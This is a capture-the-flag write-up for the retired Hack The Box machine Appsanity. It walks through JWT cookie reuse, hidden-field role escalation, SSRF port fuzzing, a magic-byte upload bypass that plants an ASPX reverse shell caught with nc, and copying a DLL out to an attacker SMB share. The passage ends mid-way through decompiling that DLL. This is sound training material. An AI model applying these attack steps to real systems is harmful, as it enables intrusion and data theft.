---
title: HTB: Appsanity
url: https://0xdf.gitlab.io/2024/03/09/htb-appsanity.html
date: 2024-03-09T14:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, ctf, htb-appsanity, nmap, tls, ffuf, vhosts, subdomain, windows, aspx, dotnet, feroxbuster, hidden-input, cookies, shared-cookie, jwt, ssrf, filter, upload, burp, burp-repeater, ssrf-fuzz, webshell, dotpeek, reverse-engineering, ghidra, x64dbg, procmon
---

![Appsanity](/img/appsanity-cover.png)

Appsanity starts with two websites that share a JWT secret, and thus I can get a cookie from one and use it on the other. On the first, I’ll register an account, and abuse a hidden input vulnerability to get evelated privilieges as a doctor role. Then I’ll use that cookie on the other site to get access, where I find a serverside request forgery, as well as a way to upload PDFs. I’ll bypass a filter to upload a webshell, and use the SSRF to reach the internal management page and trigger a reverse shell. From there, I’ll find the location of credentials in a .NET application, and extract a password from the registry to get another shell. Finally, I’ll reverse a C++ binary using ProcMon, Ghidra, and x64dbg to figure out a location where I could write a DLL and trigger it’s being loaded, giving shell as administrator.

## Box Info

| Name | [Appsanity](https://hackthebox.com/machines/appsanity)  [Appsanity](https://hackthebox.com/machines/appsanity) [Play on HackTheBox](https://hackthebox.com/machines/appsanity) |
| --- | --- |
| Release Date | [28 Oct 2023](https://twitter.com/hackthebox_eu/status/1717571816175071287) |
| Retire Date | 09 Mar 2024 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Appsanity |
| Radar Graph | Radar chart for Appsanity |
| First Blood User | 02:23:37[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 03:57:12[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [xRogue xRogue](https://app.hackthebox.com/users/338684) |

## Recon

### nmap

`nmap` finds three open TCP ports, HTTP (80), HTTPS (443), and WinRM (5985):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.238
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:02 EST
Nmap scan report for 10.10.11.238
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
oxdf@hacky$ nmap -p 80,443,5985 -sCV 10.10.11.238
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:04 EST
Nmap scan report for 10.10.11.238
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp  open  https?
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.57 seconds

```

This is clearly a Windows host, Windows 10/11 or Server 2016+. The website on port 80 is redirecting to `https://meddigi.htb`. The site on 443 returns nothing.

### Domain Analysis

#### Redirections

Visiting `http://10.10.11.238` immediately returns a 302 redirect to `https://meddigi.htb`, just as `nmap` showed. Interetingly, visiting `https://10.10.11.238` just crashes:

![image-20240228141258968](/img/image-20240228141258968.png)

I suspect they meant to have a redirect up here as well.

#### Fuzzing

I’ll try to fuzz subdomains on both HTTP and HTTPS. On HTTP, it finds nothing:

```

oxdf@hacky$ ffuf -u http://10.10.11.238 -H "Host: FUZZ.meddigi.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.238
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.meddigi.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:57] :: Errors: 0 ::

```

On HTTPS, every single request fails in an error:

```

oxdf@hacky$ ffuf -u https://10.10.11.238 -H "Host: FUZZ.meddigi.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.238
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.meddigi.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 89 req/sec :: Duration: [0:03:44] :: Errors: 19966 ::

```

I’ll add `meddigi.htb` to my `/etc/hosts` file:

```
10.10.11.238 meddigi.htb

```

If I now fuzz again targeting `https://meddigi.htb`, it doesn’t error, and does find another subdomain:

```

oxdf@hacky$ ffuf -u https://meddigi.htb -H "Host: FUZZ.meddigi.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://meddigi.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.meddigi.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

portal                  [Status: 200, Size: 2976, Words: 1219, Lines: 57, Duration: 3315ms]
:: Progress: [19966/19966] :: Job [1/1] :: 88 req/sec :: Duration: [0:04:02] :: Errors: 0 ::

```

I’ll add `portal.meddigi.htb` to my `hosts` file as well.

#### TLS Certificate

The TLS certificate on 443 shows the same hostname, `meddigi.htb`:

![image-20240228142755460](/img/image-20240228142755460.png)

### meddigi.htb - TCP 80 / 443

#### Site

The site is for a medical consulting company:

![image-20240228142848349](/img/image-20240228142848349.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s not too much of interest on the site, but I can register an account. On doing so and logging in, there’s a profile page (`/Profile`):

![image-20240228145204220](/img/image-20240228145204220.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Not much here. I can send a message to the supervisors, but no XSS payloads seem to connect back.

#### Tech Stack

The HTTP response headers show again that this is IIS:

```

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
Strict-Transport-Security: max-age=2592000
Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; samesite=lax; httponly
Date: Wed, 28 Feb 2024 19:53:24 GMT

```

On the initial visit (before logging in) it sets a blank `.AspNetCore.Mvc.CookieTempDataProvider` cookie, which suggests this is an ASP .NET application. That cookie does get set while browsing around the site.

I’m not able to guess any extensions. On a bad page, it just redirects to `/Home`.

On logging in, another cookie is set:

```

HTTP/2 302 Found
Location: /Profile
Server: Microsoft-IIS/10.0
Strict-Transport-Security: max-age=2592000
Set-Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6IjB4ZGZAbWVkZGlnaS5odGIiLCJuYmYiOjE3MDkxNTE0MzgsImV4cCI6MTcwOTE1NTAzOCwiaWF0IjoxNzA5MTUxNDM4LCJpc3MiOiJNZWREaWdpIiwiYXVkIjoiTWVkRGlnaVVzZXIifQ.mMHBaemx7FjdgSR90NdIgfLPoB9_fjbrEqvGFJbqokc; expires=Wed, 28 Feb 2024 22:17:18 GMT; path=/; secure; samesite=strict; httponly
Date: Wed, 28 Feb 2024 20:17:18 GMT

```

That’s a JWT set as the `access_token`, which decodes to:

```

{
  "unique_name": "7",
  "email": "0xdf@meddigi.htb",
  "nbf": 1709151438,
  "exp": 1709155038,
  "iat": 1709151438,
  "iss": "MedDigi",
  "aud": "MedDigiUser"
}

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, using a lowercase wordlist as IIS isn’t case sensitive. It doesn’t return anything I don’t already know about:

```

oxdf@hacky$ feroxbuster -u https://meddigi.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://meddigi.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        2l       10w      147c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      514l     1889w    32809c https://meddigi.htb/
200      GET        8l       14w      194c https://meddigi.htb/error
200      GET      514l     1889w    32809c https://meddigi.htb/home
302      GET        0l        0w        0c https://meddigi.htb/profile => https://meddigi.htb/Home
200      GET      108l      472w     7847c https://meddigi.htb/signup
200      GET       76l      204w     3792c https://meddigi.htb/signin
400      GET        6l       26w      324c https://meddigi.htb/error%1F_log
[####################] - 1m     26584/26584   0s      found:7       errors:0
[####################] - 1m     26584/26584   420/s   https://meddigi.htb/ 

```

`/error` returns:

![image-20240228152857988](/img/image-20240228152857988.png)

### portal.meddigi.htb

#### Site

The site presents a login form:

![image-20240228151359622](/img/image-20240228151359622.png)

To log in, I’ll need an email and “Doctor Ref.Number”.

#### Tech Stack

The HTTP response headers look exactly the same as the main site:

```

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
Strict-Transport-Security: max-age=2592000
Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; samesite=lax; httponly
Date: Wed, 28 Feb 2024 20:12:01 GMT

```

#### Directory Brute Force

`feroxbuster` finds a couple endpoints that require auth (302 redirects to `/Login`), but not much else:

```

oxdf@hacky$ feroxbuster -u https://portal.meddigi.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://portal.meddigi.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        2l       10w      155c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       57l      162w     2976c https://portal.meddigi.htb/
200      GET       57l      162w     2976c https://portal.meddigi.htb/login
200      GET        8l       14w      194c https://portal.meddigi.htb/error
302      GET        0l        0w        0c https://portal.meddigi.htb/profile => https://portal.meddigi.htb/Login
302      GET        0l        0w        0c https://portal.meddigi.htb/equipment => https://portal.meddigi.htb/Login
302      GET        0l        0w        0c https://portal.meddigi.htb/scheduler => https://portal.meddigi.htb/Login
400      GET        6l       26w      324c https://portal.meddigi.htb/error%1F_log
[####################] - 1m     26584/26584   0s      found:7       errors:0
[####################] - 1m     26584/26584   425/s   https://portal.meddigi.htb/ 

```

## Shell as svc\_exampanel

### Access Portal

#### Hidden Field Manipulation

Looking at the POST request to register an account, there’s an interesting field in the body:

```

POST /Signup/SignUp HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8G5wpJNGr61AqaSs4NeQzGECU5I-qpOUJ4m4QT6B8N0jzDeFYOrDeYjnpAqfLxfAKWZz-odFKvD48Ht6m4HwKivMzkuFPoGFpANf8KiNS5FbqRMt7Z89Z7Ky3hDJyB9BKKEYWdvEfnZu1lZbgg3_K_M
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 338
Origin: https://meddigi.htb
Referer: https://meddigi.htb/signup

Name=df&LastName=df&Email=0xdf%40meddigi.htb&Password=0xdf0xdf&ConfirmPassword=0xdf0xdf&DateOfBirth=2000-01-01&PhoneNumber=1111111111&Country=usa&Acctype=1&__RequestVerificationToken=CfDJ8G5wpJNGr61AqaSs4NeQzGHnf8qh8M3yVMWpESf7wR0J44Sj7nle56Z34HuOgerWHBH4HwQFqKqIakDHJ9mPiFvbc2a7ZP4s6KXa1yeinoEqXfL1dSiyLqXl-adU1xY8TomxlMbnRO4CyHUMk4ypUKA

```

In addition to the data entered in the form, there’s a `Acctype` parameter. That comes from a hidden `input` tag in the HTML form:

```

<input type="hidden" data-val="true" data-val-required="The Acctype field is required." id="Acctype" name="Acctype" value="1" />

```

The response to a successful login is a 302 redirect to `/Signin`.

I’ll send this request to Burp Repeater and mess with that a bit. If I set it to 0, the response is a 302 redirect to `/Signup`. This implies failure registering.

![image-20240228150900922](/img/image-20240228150900922.png)

If I change that to 2, it redirects to `/Signin`:

![image-20240228150947366](/img/image-20240228150947366.png)

Going up to 3 leads back to `/Signup`, so it seems like 1 and 2 are the only valid values here.

#### Auth as Doctor on Main Site

If I log in with the account created with type 2, now it shows the account is a Doctor:

![image-20240228151115857](/img/image-20240228151115857.png)

There’s not much else here. I can add patients to be supervised, but it doesn’t seem to do much.

#### Cookie Sharing

The tech stacks of the two websites seem very similar. Thinking about the JWT that gets set when I log in on the main site, if the portal site was written by the same developers, it could have used the same signing secret and the same cookie name. If that’s the case, the cookie generated by one would be valid on the other.

I’ll go into the dev tools and create a cookie for `portal.meddigi.htb`, placing the doctor level cookie from the other site in there:

![image-20240228153945486](/img/image-20240228153945486.png)

On refreshing, the browser redirects to `/Profile`:

![image-20240228204337077](/img/image-20240228204337077.png)

It’s the same info as the other site as well!

### Site Enumeration

Each of the items in the menu bar on the left have different forms that can be submitted. The two most interesting are “Issue Prescriptions” (`/Prescriptions`) and “Upload Report” (`/examreport`).

#### Prescriptions

The Prescriptions page is interesting because one of the items it takes is a link:

![image-20240228205713028](/img/image-20240228205713028.png)

Any time I can submit a link to a site it’s worth digging into. If I put in my host as the link:

![image-20240228205912348](/img/image-20240228205912348.png)

On hitting submit, it contacts my Python webserver:

```
10.10.11.238 - - [28/Feb/2024 20:58:55] code 404, message File not found
10.10.11.238 - - [28/Feb/2024 20:58:55] "GET /prescriptions HTTP/1.1" 404 -

```

And displays the result:

![image-20240228205937617](/img/image-20240228205937617.png)

If I create that page:

```

oxdf@hacky$ echo "<h1>Test Page</h1>" > prescriptions

```

On submitting again, it shows the page:

![image-20240228210100701](/img/image-20240228210100701.png)

Looks like a solid server-side request forgery (SSRF).

#### Upload Reports

The Reporting page allows for file upload:

![image-20240228205809613](/img/image-20240228205809613.png)

I’ll fill it out, and after passing all the client-side validation, submit, and it returns:

![image-20240228210355992](/img/image-20240228210355992.png)

If I use a PDF, it shows:

![image-20240228210517146](/img/image-20240228210517146.png)

### Access to Internal Site

#### Fuzz Ports Prep

I’ve already shown an SSRF [above in the Prescriptions panel](#prescriptions). I’ll use that to fuzz listening ports on the internal network, in this case on localhost.

This command is a bit tricky to build, so I’ll work up to it slowly. I’ll start by getting rid of headers in the request to make sure I know which ones actually matter. I’ll submit in the site, and send the request to Repeater. Then I can get rid of a couple headers, send, and make sure the response is the same. That confirms I can get rid of those headers. `Content-Type` is a good one to notice - without that the request fails. I’ll need that when I craft a `ffuf` command.

In Repeater, I’ll look at what happens with it requests a link on a listening port on my host:

![image-20240301152956347](/img/image-20240301152956347.png)

It’s a 200 response, with the actual HTML from my host in the body. It’s also a very fast response, about 3.5 seconds.

If I change that to a port that’s not listening (81), it returns a 302 to `/Error`:

![image-20240301153102616](/img/image-20240301153102616.png)

It also takes 2.7 seconds, way longer! That makes sense, as it’s trying to connect and waiting for a timeout.

#### Fuzz Ports

My initial gut was to scan all 65535 ports, but that proved way too slow, especially because I want to fuzz on both HTTP and HTTPS. I’ll start with a wordlist from [SecLists](https://github.com/danielmiessler/SecLists), `common-http-ports.txt`. I’ll need to include:
- `-d 'Email=0xdf@meddigi.htb&Link=http(s)://127.0.0.1:FUZZ'` - The data in the POST request.
- `-w common-http-ports.txt` - The wordlist.
- `-u https://portal.meddigi.htb/Prescriptions/SendEmail` - The URL to target.
- `-H 'Content-Type: application/x-www-form-urlencoded` - The `Content-Type` header.
- `- mc 200` - Filter out to show only HTTP 200 responses
- `-b "access_token=$token"` - My cookie, which I’m storing in a Bash variable to make the command more mangagable.

On HTTPS it finds nothing:

```

oxdf@hacky$ ffuf -d 'Email=0xdf@meddigi.htb&Link=https://127.0.0.1:FUZZ' -w /opt/SecLists/Discovery/Infrastructure/common-http-ports.txt -u 'https://portal.meddigi.htb/Prescriptions/SendEmail' -H 'Content-Type: application/x-www-form-urlencoded' -mc 200 -b "access_token=$token"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://portal.meddigi.htb/Prescriptions/SendEmail
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Infrastructure/common-http-ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6IjB4ZGYyQG1lZGRpZ2kuaHRiIiwibmJmIjoxNzA5MzIyMzM5LCJleHAiOjE3MDkzMjU5MzksImlhdCI6MTcwOTMyMjMzOSwiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.ofzJS2ZE7OOwdsRRZ98daXdA8OkQ3kbEuNYEtRnZLR4
 :: Data             : Email=0xdf@meddigi.htb&Link=https://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

:: Progress: [35/35] :: Job [1/1] :: 5 req/sec :: Duration: [0:00:08] :: Errors: 0 ::

```

On HTTP, it finds 8080:

```

oxdf@hacky$ ffuf -d 'Email=0xdf@meddigi.htb&Link=http://127.0.0.1:FUZZ' -w /opt/SecLists/Discovery/Infrastructure/common-http-ports.txt -u 'https://portal.meddigi.htb/Prescriptions/SendEmail' -H 'Content-Type: application/x-www-form-urlencoded' -mc 200 -b "access_token=$token"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://portal.meddigi.htb/Prescriptions/SendEmail
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Infrastructure/common-http-ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6IjB4ZGYyQG1lZGRpZ2kuaHRiIiwibmJmIjoxNzA5MzIyMzM5LCJleHAiOjE3MDkzMjU5MzksImlhdCI6MTcwOTMyMjMzOSwiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.ofzJS2ZE7OOwdsRRZ98daXdA8OkQ3kbEuNYEtRnZLR4
 :: Data             : Email=0xdf@meddigi.htb&Link=http://127.0.0.1:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

8080                    [Status: 200, Size: 2060, Words: 688, Lines: 54, Duration: 3565ms]
:: Progress: [35/35] :: Job [1/1] :: 1 req/sec :: Duration: [0:00:20] :: Errors: 1 ::

```

#### Load Site

Back in the browser, I’ll submit `http://127.0.0.1:8080` as the prescription url:

![image-20240301154046582](/img/image-20240301154046582.png)

Interestingly, not only does it show a line that’s always there, but the second line in this table is a report I’ve recently uploaded! If I scroll over, there’s a link to the PDF:

![image-20240301154132381](/img/image-20240301154132381.png)

I can grab the URL from that, and back in Repeater, fetch the PDF:

![image-20240301154253109](/img/image-20240301154253109.png)

At this point, I have access to files that I upload.

### Reverse Shell

#### Filter Bypass

As this is a .NET webserver, I would like to upload an ASPX webshell and see if I can trigger it via the SSRF. I’ll upload my PDF again, and get that request into Repeater. I’ve observed that the filename it gets saved at seems to prepend some data but then end in `_[original file name]`. My first question is if I can change the file extension to `.aspx` and get it to still upload. I’ll not change the payload, but only the form data `filename`:

![image-20240301155905617](/img/image-20240301155905617.png)

The response looks just like the unmodified request! I’ll use the SSRF to load `http://127.0.0.1:8080` and see that the file does exist at the `.aspx` extension. I can pull the file too:

![image-20240301160121230](/img/image-20240301160121230.png)

Back in the Repeater tab submitting the PDF, I’ll try to remove the PDF body and replace it with text. If I remove the entire thing and just have “0xdf was here”, it still looks successful:

![image-20240301160338898](/img/image-20240301160338898.png)

But the file isn’t there with the SSRF.

However, if I leave the start of the PDF (the “magic bytes”) and replace the body with my text like this:

![image-20240301160435787](/img/image-20240301160435787.png)

Then there is a new link, and I can fetch it over the SSRF:

![image-20240301160518473](/img/image-20240301160518473.png)

So the webserver seems to be validinting the file based on the magic bytes.

#### Shell

I’ll grab an [ASPX reverse shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) from GitHub, and put it in place of my text, making sure to update the callback IP and port. To make things easier, I’ll update the patient name to “reverseshell” (spaces break it). I’ll upload it, and fetch the admin page via the SSRF in the web browser:

![image-20240301160928009](/img/image-20240301160928009.png)

The report link is `https://portal.meddigi.htb/ViewReport.aspx?file=887947b0-f4ba-4939-8181-7d9d195b7d21_dummy.aspx`, so I’ll update my SSRF trigger in Repeater (with `nc` listening):

![image-20240301161029674](/img/image-20240301161029674.png)

When I send, it just hangs, but a few seconds later at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.238 62885
Spawn Shell...
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv> whoami
appsanity\svc_exampanel

```

The user flag is on the exampanel user’s desktop:

```

c:\Users\svc_exampanel\Desktop> type user.txt
1198a84a************************

```

Running `powershell` converts this shell from `cmd` to `powershell`, which is also nice.

## Shell as devdoc

### Enumeration

#### Users

There are a handful of other users on the box:

```

PS C:\Users> dir

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/18/2023   6:08 PM                Administrator
d-----         9/24/2023  11:16 AM                devdoc
d-r---         9/15/2023   6:59 AM                Public
d-----        10/18/2023   6:40 PM                svc_exampanel
d-----        10/17/2023   3:05 PM                svc_meddigi
d-----        10/18/2023   7:10 PM                svc_meddigiportal

```

The svc\_exampanel user can’t access any of these directories.

The `net user` command gives similar results:

```

PS C:\Users> net user

User accounts for \\APPSANITY
-------------------------------------------------------------------------------
Administrator            DefaultAccount           devdoc                   
Guest                    svc_exampanel            svc_meddigi              
svc_meddigiportal        WDAGUtilityAccount       
The command completed successfully.

```

#### Web

The `C:\inetpub` directory has the IIS-related files:

```

PS C:\inetpub> ls

    Directory: C:\inetpub

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/15/2023   7:22 AM                custerr
d-----          3/1/2024   1:14 PM                Databases
d-----         9/24/2023   8:49 AM                ExaminationPanel
d-----        10/23/2023  12:41 PM                history
d-----         9/15/2023   7:24 AM                logs
d-----         9/24/2023   8:50 AM                MedDigi
d-----         9/24/2023   9:15 AM                MedDigiPortal
d-----         9/15/2023   7:22 AM                temp
d-----         9/16/2023   9:58 AM                wwwroot

```

My guess is that `MedDigi` is the main site, `MedDigiPortal` is the portal site, and `ExaminationPanel` is the private site on 8080. This user can’t access the other sites.

In `ExaminatinPanel`, there’s another directory of the same name, which has:

```

PS C:\inetpub\ExaminationPanel\ExaminationPanel> ls

    Directory: C:\inetpub\ExaminationPanel\ExaminationPanel

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/26/2023   7:30 AM                bin
d-----          3/1/2024   1:45 PM                Reports
d-----          3/1/2024   1:10 PM                tmp
-a----         9/24/2023   8:46 AM            409 Error.aspx
-a----         9/24/2023   8:46 AM            105 Global.asax
-a----         9/24/2023   8:46 AM           1863 Index.aspx
-a----         9/24/2023   8:46 AM            363 ViewReport.aspx
-a----        10/18/2023   7:03 PM           2883 Web.config

```

`Reports` has the uploaded reports (though my webshell has been cleaned up, presumably by some HTB cleanup script).

`bin` has the executables that run the site:

```

PS C:\inetpub\ExaminationPanel\ExaminationPanel\bin> ls

    Directory: C:\inetpub\ExaminationPanel\ExaminationPanel\bin

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/24/2023   8:49 AM                roslyn
d-----         9/24/2023   8:49 AM                x64
d-----         9/24/2023   8:49 AM                x86
-a----         9/24/2023   8:46 AM        4991352 EntityFramework.dll
-a----         9/24/2023   8:46 AM         591752 EntityFramework.SqlServer.dll
-a----         9/24/2023   8:46 AM          13824 ExaminationManagement.dll
-a----         9/24/2023   8:46 AM          40168 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
-a----         9/24/2023   8:46 AM         431792 System.Data.SQLite.dll
-a----         9/24/2023   8:46 AM         206512 System.Data.SQLite.EF6.dll
-a----         9/24/2023   8:46 AM         206520 System.Data.SQLite.Linq.dll

```

All but one of these, if I search for them, return references to frameworks for web development in .NET. `ExaminationManagement.dll` is custom to Appsanity.

### ExaminationManagement.dll

#### Exfil

I’ll start an SMB server on my host using Impacket’s `smbserver.py`:

```

oxdf@hacky$ smbserver.py -smb2support -username oxdf -password oxdf share `pwd`
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Now on Appsantiy I’ll connect to the share and copy the file into it:

```

PS C:\> net use \\10.10.14.6\share /u:oxdf oxdf
The command completed successfully.
PS C:\> copy \inetpub\ExaminationPanel\ExaminationPanel\bin\examinationManagement.dll \\10.10.14.6\share\

```

I’ve got the file on my system:

```

oxdf@hacky$ file ExaminationManagement.dll 
ExaminationManagement.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows

```

#### Reversing

My tool of choice at the moment for reversing .NET binaries is [DotPeek](https://www.jetbrains.com/decompiler/), though if I wanted to stay on a Linux VM I could use [ILSpy](https://github.com/icsharpcode/ILSpy).

I’ll open it up, and take a look:

![image-20240301171747299](/img/image-20240301171747299.png)

Looking at `index`, there are functions related to encryption / decryption:

![image-20240301171827229](/img/image-20240301171827229.png)

`RetrieveEncryptionKeyFromRegistery` is an interesting sounding function:

```

    private string RetrieveEncryptionKeyFromRegistry()
    {
      try
      {
        using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\MedDigi"))
        {
          if (registryKey == null)
          {
            ErrorLogger.LogError("Registry Key Not Found");
